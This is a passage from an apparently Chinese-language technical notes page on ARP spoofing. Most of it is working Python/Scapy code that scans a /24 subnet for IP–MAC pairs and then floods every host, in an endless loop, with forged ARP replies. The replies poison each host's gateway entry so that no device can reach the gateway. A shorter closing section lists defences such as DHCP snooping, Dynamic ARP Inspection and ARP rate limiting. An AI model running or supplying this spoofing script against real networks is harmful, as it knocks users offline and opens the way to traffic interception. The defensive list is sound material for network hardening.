    import ipaddress
    # # 验证IP地址是否合法
    # ip_pattern = r'(([1-9]?\d|1\d\d|2[0-4]\d|25[0-5])\.){3}([1-9]?\d|1\d\d|2[0-4]\d|25[0-5])'
    # match = re.fullmatch(ip_pattern,start_ip)
    # if not match:
    #     raise ValueError("start_ip is not a valid IP address")

    # 提取网段起始IP地址的网络号
    net4 = ipaddress.ip_network(start_ip)
    # net.network_address 网段的网络地址
    # net.broadcast_address 网段的广播地址

    allIps = [str(ip) for ip in net4.hosts()]
    playload = b'\0' * 18
    ip_mac = {}

    for ip in allIps:

        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, hwdst="00:00:00:00:00:00") / playload
        answered, unanswered = srp(arp_request, timeout=0.5,verbose=0)

        for s, r in answered:
            print(f"IP地址:{ip}  MAC地址:{r.hwsrc}") # 打印响应的IP地址和MAC地址
            ip_mac[ip] = r.hwsrc

    return ip_mac

def arp_spoof(spoof_ip : str ,spoof_mac : str ,attack_ip : str ,attack_mac : str ): 
    '''
    欺骗局域网内所有主机的对于网关的ARP记录,使得任何设备都无法访问网关(注意需要排除自身IP)

    :param spoof_ip: 网关的IP地址
    :param spoof_mac: 网关的MAC地址(可伪造一个不存在的MAC地址) 例如: 01:02:03:04:05:06
    :param attack_ip: 想要攻击的主机的IP地址
    :param attack_mac:想要攻击的主机所对应的MAC地址
    '''

    # 构造ARP欺骗包,欺骗目标IP地址的保存的网关ARP记录
    # 假冒网关给目标主机发送ARP响应包,那么需要将Ether的src改成01:02:03:04:05:06,dst改成目标IP地址对应的MAC地址
    # ARP的op字段为2表示响应包,psrc字段为网关的IP地址,hwsrc字段为01:02:03:04:05:06,pdst字段为目标IP地址,hwdst字段为目标IP地址对应的MAC地址

    arp_response = Ether(src = spoof_mac,dst=attack_mac)/ARP(op=2, psrc=spoof_ip,hwsrc=spoof_mac,pdst=attack_ip,hwdst=attack_mac)

    # 发送ARP欺骗包
    sendp(arp_response)

def arp_attack():
    # 获取网段内的所有主机IP地址以及对应的MAC地址
    all_ips = getAllHostInfo("192.168.100.0/24")

    while True:
        for ip,mac in all_ips.items():
            arp_spoof(spoof_ip="192.168.100.1",spoof_mac="01:02:03:04:05:06",attack_ip=ip,attack_mac=mac)</code></pre><h5 id=53866224_></h5><ul><li><p>华为设备配置防ARP攻击</p><blockquote><p><a href=https://support.huawei.com/enterprise/zh/doc/EDOC1100271738/780a867f rel="noopener noreferrer nofollow" target=_blank>https://support.huawei.com/enterprise/zh/doc/EDOC1100271738/780a867f</a></p></blockquote></li><li><p>防ARP攻击的常用方法</p><ul><li>开启IP-MAC静态绑定</li><li>开启DHCP Snooping,基于DHCP snooping验证IP合法性做IP Source Guard（源验证）</li><li>动态ARP检测(Dynamic ARP Inspection)</li><li>windows端 arp -s 命令静态绑定(不适合大规模网络)</li><li></li><li>配置ARP报文限速</li><li>设备对ARP报文进行数量统计，在一定时间内，如果ARP报文数量超出了配置的阈值，超出部分的ARP报文将被忽略，设备不作任何处理，有效防止ARP表项溢出。</li><li>配置ARP表项限制</li><li>设备基于接口限制学习ARP表项的总数目，可以有效的防止ARP表项溢出，保证ARP表项的安全性。</li><li>配置ARP表项严格学习。</li><li>设备仅学习自己发送的ARP请求报文的应答报文，并不学习其它设备向路由器发送的ARP请求报文，即可以拒绝掉大部分的ARP请求报文攻击</li><li>禁止接口学习ARP表项的功能。</li><li>出于安全或管理上的考虑，用户禁止指定接口学习ARP表项的功能，可以有效防止ARP表项溢出，保证ARP表项的安全性</li><li>配置ARP报文有效性检查。</li><li>设备收到ARP报文时，对以太报文头中的源、目的MAC地址和ARP报文数据区中的源、目的MAC地址进行一致性检查。如果以太报文头中的源、目的MAC地址和ARP报文数据区中的源、目的MAC地址不一致，则直接丢弃该ARP报文,否则允许该ARP报文通过。</li></ul></li></ul><h5 id=53866224_扩展>扩展</h5><ul><li>arp欺骗后的路由转发</li></ul><div class=parsedown-markdown-end_FLAG_ZXSQ style=display:none></div></div></div></body></html>